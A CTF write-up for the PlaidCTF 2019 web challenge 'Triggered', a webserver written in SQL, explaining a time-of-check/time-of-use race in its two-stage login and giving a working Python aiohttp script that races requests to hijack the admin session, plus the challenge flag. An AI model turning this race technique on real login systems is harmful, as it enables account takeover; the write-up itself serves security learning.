---
title:  "PlaidCTF 2019: Triggered (web)"
date:   2019-04-18
categories: [writeup]
tags: [writeups, web]
---

For this challenge we have an utter atrocity against mankind, a webserver written entirely in SQL.

![Challenge description](/images/plaid19/triggered/description.png)

No joke, the challenge is one [large SQL file](/static/plaid19/triggered/schema.sql). That's 1730 lines of pure SQL madness. SQL handles all parts, including header parsing and even going so far to implement it's own templating system! A true wonder, I also commend the Plaid team for somehow keeping the server running with what must have been a lot of sqlmap scans.

As for the application itself, it's common CTF fare. A website you can register, login, write posts and search for posts. A time honoured classic. From the main page we know we need to somehow get a flag from the admin user:

![homepage](/images/plaid19/triggered/homepage.png)

So far this is all very standard. We have an admin user account we need to somehow gain access to, or trick into sending us the flag. Now, what would you think of a challenge involving a heavy focus on SQL would involve? What common vulnerability do you immediately think of? Almost so obvious it's routinely exploited across the web?

**A race condition of course!**

With so much attack surface, I'm slightly shocked it came down to a [TOCTOU](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use) vuln. I'd be interested to hear from others if there was a more involved solution I skipped. As it was, I was tipped off by the weird two stage login system:

![login1](/images/plaid19/triggered/login1.png)
<p style="text-align: center">First Stage <i>/login</i></p>

![login2](/images/plaid19/triggered/login2.png)
<p style="text-align: center">Second Stage <i>/login/password</i></p>

Seemed like extra work that didn't add anything to the site. Perhaps with the limitation of _only using sql_ perhaps this was needed? Either way this is where the vulnerability lay.

The functions to handle these two forms are:

```sql
---------- POST /login
CREATE FUNCTION web.handle_post_login() RETURNS TRIGGER AS $$
DECLARE
  form_username text;
  session_uid uuid;
  form_user_uid uuid;
  context jsonb;
BEGIN
  SELECT
    web.get_form(NEW.uid, 'username')
  INTO form_username;

  SELECT
    web.get_cookie(NEW.uid, 'session')::uuid
  INTO session_uid;

  SELECT
    uid
  FROM
    web.user
  WHERE
    username = form_username
  INTO form_user_uid;

  IF form_user_uid IS NOT NULL
  THEN
    INSERT INTO web.session (
      uid,
      user_uid,
      logged_in
    ) VALUES (
      COALESCE(session_uid, uuid_generate_v4()), <- 1
      form_user_uid,
      FALSE
    )
    ON CONFLICT (uid)
      DO UPDATE
      SET
        user_uid = form_user_uid,               <- 2
        logged_in = FALSE
    RETURNING uid
    INTO session_uid;

    PERFORM web.set_cookie(NEW.uid, 'session', session_uid::text);
    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
  ELSE
    PERFORM web.respond_with_redirect(NEW.uid, '/login');
  END IF;

  RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```

and:

```sql
---------- POST /login/password
CREATE FUNCTION web.handle_post_login_password() RETURNS TRIGGER AS $$
DECLARE
  form_password text;
  session_uid uuid;
  success boolean;
BEGIN
  SELECT
    web.get_cookie(NEW.uid, 'session')::uuid
  INTO session_uid;

  IF session_uid IS NULL
  THEN
    PERFORM web.respond_with_redirect(NEW.uid, '/login');
    RETURN NEW;
  END IF;

  SELECT
    web.get_form(NEW.uid, 'password')
  INTO form_password;

  IF form_password IS NULL
  THEN
    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
    RETURN NEW;
  END IF;

  SELECT EXISTS (
    SELECT
      *
    FROM
      web.user usr
        INNER JOIN web.session session
          ON usr.uid = session.user_uid
    WHERE
      session.uid = session_uid                                         <- 3
        AND usr.password_hash = crypt(form_password, usr.password_hash) <- 3
  )
  INTO success;
-------- RACE GOES HERE -------- <- 4
  IF success
  THEN
    UPDATE web.session
    SET
      logged_in = TRUE            <- 5
    WHERE
      uid = session_uid;          <- 6

    PERFORM web.respond_with_redirect(NEW.uid, '/');
  ELSE
    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
  END IF;

  RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```


Looking at these again it strikes me with both awe and disgust. The important parts I've marked with numbers.  
**Stage 1:**  
1\. `COALESCE` in SQL returns the first non NULL argument. This essentially allows us to fix a session at login by sending our own session cookie.  
2\. This sets `user_uid` in the `web.session` table to the `user_id` of the username we're trying to login with. This is mapped to the `web.user` table  

**Stage 2:**  
3\. This is the login check, first it ensures we're the same session as we used in stage1 and that the submitted password matches the one saved for `user_id`  
4\. This is where we're aiming to race  
5\. This marks a session as logged in  
6\. Marking only the session we gave in our session cookie  

The race allows us to change the `user_id` of our session _after_ we've compared the passwords but _before_ we've marked the session as logged in. This means we'd have a valid logged in session with a forged `user_id`. Now if you're astute you might be asking, "What's stopping us from just doing another stage1 login which would just as easily set our `user_id` to whatever we wanted? (see step 2)". Good point, sadly they log out every session in stage 1:

```sql
INSERT INTO web.session (
  uid,
  user_uid,
  logged_in
) VALUES (
  COALESCE(session_uid, uuid_generate_v4()), <- 1
  form_user_uid,
  FALSE
)
```

Nice try though, but that is the right thinking! We're just gonna do that, _but fast_. We're aiming for a session table that would look have a `user_uid` of an admin, with a `TRUE` value in `logged_in`. We can do this by abusing two http requests to force our steps to be done in a malicious order since each request runs _concurrently_.

So we did:
```
req1: 1 -> 2
req2:          3 -> 4 -> 5 -> 6
req3:          1 -> 2
```

Our racing req3 will end up setting the `user_uid` of our session to whatever we wanted (at step 2). Then req2 will mark it as `logged_in` at step 5 after we've already passed the password check at step 3! To do this I played with the cool `aiohttp` module to do python3 async requests.

```python
import aiohttp
import asyncio
import time

# Set to your session cookie value
session_cookie = {"session": "8fc8c228-6409-4d1f-8677-d8155cd32f04"}
headers        = {'Content-Type': 'application/x-www-form-urlencoded'}

async def doLogin(session, url, username):
    resp = await session.post(url, data=b"username=" + str(username).encode(), headers=headers)
    resp.raise_for_status()
    print("Got response [{}] for URL: {}".format(resp.status, url))
    return resp.status

async def doPassword(session, url):
    resp = await session.post(url, data=b"password=poop", headers=headers)
    resp.raise_for_status()
    print("Got response [{}] for URL: {}".format(resp.status, url))
    return resp.status

async def main():
    # force aiohttp to send on different HTTP requests
    conn = aiohttp.TCPConnector(force_close=True)

    async with aiohttp.ClientSession(connector=conn, cookies=session_cookie) as session:
        login_post = doLogin(session, "http://triggered.pwni.ng:52856/login", "poop")

        # Wait for the stage1 to finish
        print("LOGIN1 = " + str(await login_post))

        # immediately fire requests
        login_post_race = asyncio.ensure_future(doLogin(session, "http://triggered.pwni.ng:52856/login", "admin"))
        password_post   = asyncio.ensure_future(doPassword(session, "http://triggered.pwni.ng:52856/login/password"))

        # wait for both requests to finish
        await password_post
        await login_post_race


loop = asyncio.get_event_loop()
loop.run_until_complete(main())
```

After a brief search, we get ourselves the flag:

![flag](/images/plaid19/triggered/flag.png)

**PCTF{i_rAt3_p0sTgRE5_1O_oUT_0f_14_pH_n3ed5_m0Re_4Cid}**


Fun challege, and major props to the madlad who made a SQL only webserver.
